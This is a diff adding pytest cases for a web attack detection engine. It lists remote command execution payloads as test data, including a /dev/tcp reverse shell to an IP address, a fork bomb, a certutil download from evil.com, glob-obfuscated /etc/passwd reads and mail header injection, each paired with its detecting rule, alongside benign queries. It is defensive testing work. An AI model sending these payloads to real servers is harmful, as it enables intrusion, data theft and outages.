@@ -2008,3 +2008,88 @@ def test_a_referer_carrying_the_last_page_s_payload_is_not_an_attack(engine: Rul
     (labelled,) = engine.label_events([request("/contact", referer=referer)])
 
     assert not [label for label in labelled.all_labels if label.category.is_hostile]
+
+
+#: Remote command execution shapes the 2026-10-05 pass added, each with the rule
+#: meant to catch it. From the CRS regression corpus (family 932).
+RCE_ATTACKS: list[tuple[str, str]] = [
+    ("/get?s=/etc/pa[s]swd", "shell_glob_path"),
+    ("/get?932130-20=cat /[e//]tc/[p//]asswd", "shell_glob_path"),
+    ("/get?vuln=/???/??t", "shell_glob_path"),
+    ("/get?shell=/usr/[a-z]in/bash", "shell_glob_path"),
+    ("/get?932280-4={,ifconfig}", "shell_brace_expansion"),
+    ("/get?932280-2=c{a,oun}t", "shell_brace_expansion"),
+    ("/get?932280-1={l,-lh}s", "shell_brace_expansion"),
+    ("/get?932290-2='wh'oami", "shell_disguised_command"),
+    ('/get?932290-5="w"get localhost', "shell_disguised_command"),
+    ("/get?foo=ti''me sh -c whoami", "shell_disguised_command"),
+    ("/get?foo='time' who", "shell_disguised_command"),
+    ("/get?x=pi$()ng 127.0.0.1", "shell_syntax_in_value"),
+    ("/get?x=ping`` 127.0.0.1", "shell_syntax_in_value"),
+    ("/get?out=>(tee log)", "shell_syntax_in_value"),
+    ("/get?cmd=:(){ :|:& };:", "shell_syntax_in_value"),
+    ("/get?cmd=d=/dev&&(sh)0>$d/tcp/51.15.142.164/777", "shell_syntax_in_value"),
+    ('/get?932236-1=bash -c "echo test"', "shell_invocation"),
+    ('/get?code=$shell -c "echo hi"', "shell_invocation"),
+    ("/get?arg=;ps", "shell_invocation"),
+    ("/get?test=ll /var/www/", "shell_invocation"),
+    ("/get?attackme= mail from:<a@b.com>", "mail_command_injection"),
+    ("/get?attackme= rcpt to:<postmaster>", "mail_command_injection"),
+    ("/get?attackme= ehlo test.com", "mail_command_injection"),
+    ("/get?attackme= a001 examine inbox", "mail_command_injection"),
+    # How it arrives for real, after an encoded line break (not from the corpus).
+    ("/contact?subject=hi%0d%0arcpt%20to:%3Cv@example.com%3E", "mail_command_injection"),
+    ("/get?cmd=; certutil -urlcache -f http://evil.com/payload.exe", "windows_living_off_the_land"),
+    ("/get?cmd=; mshta http://example.com", "windows_living_off_the_land"),
+    ("/get?view=image.jpg&bcdboot /r file.txt", "windows_living_off_the_land"),
+    ("/get?foo=& for %- in (a,b,c) do cmd", "windows_batch_for"),
+    ("/get?foo=if/i a==b foo", "windows_batch_if"),
+    ('/get?foo=if "a a" == "a a" echo same', "windows_batch_if"),
+]
+
+#: What the corpus certifies as harmless for 932 (the query-borne ones), and
+#: the searches each new pattern was tried against before it was written.
+RCE_BENIGN: list[str] = [
+    "/get?page=page[1]",
+    "/get?field_metatags[0][advanced][rights]=somevalue",
+    "/get?id=does the * shine bright?",
+    "/get?args=;environment",
+    "/get?args=;performance",
+    "/get?test=times & schedule",
+    "/get?test=time express",
+    "/get?foo=time warner",
+    "/get?x=find x for y",
+    "/get?param=rc",
+    "/get?x=kills foo bar",
+    '/get?932281-6=[{"value":true,"key":"enabled","scope":"filerequest"}]',
+    '/get?932281-8={"single_blog_post_related_order_meta_first":[{},{}]}',
+    "/get?cmd=go to store. at the store, shop.",
+    "/get?r=queue/sendmails",
+    # The searches each pattern was tried on.
+    "/s?q=what time who wins",
+    "/s?q=sh -c tutorial",
+    "/docs?q=bash -c example",
+    "/s?q=a{b,c}",
+    "/s?q=o''brien",
+    "/s?q=jquery $() selector",
+    "/s?next=/search?q=lamp&x=1",
+    "/s?q=mail from: support",
+]
+
+
+@pytest.mark.parametrize(("target", "rule_id"), RCE_ATTACKS)
+def test_command_execution_shapes_are_caught_by_their_rule(
+    engine: RuleEngine, target: str, rule_id: str
+) -> None:
+    (labelled,) = engine.label_events([request(target)])
+
+    fired = {label.rule_id for label in labelled.all_labels}
+    assert rule_id in fired, f"{rule_id} did not fire on {target!r}; fired: {sorted(fired)}"
+
+
+@pytest.mark.parametrize("target", RCE_BENIGN)
+def test_command_execution_rules_stay_off_ordinary_text(engine: RuleEngine, target: str) -> None:
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [label.rule_id for label in labelled.all_labels if label.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
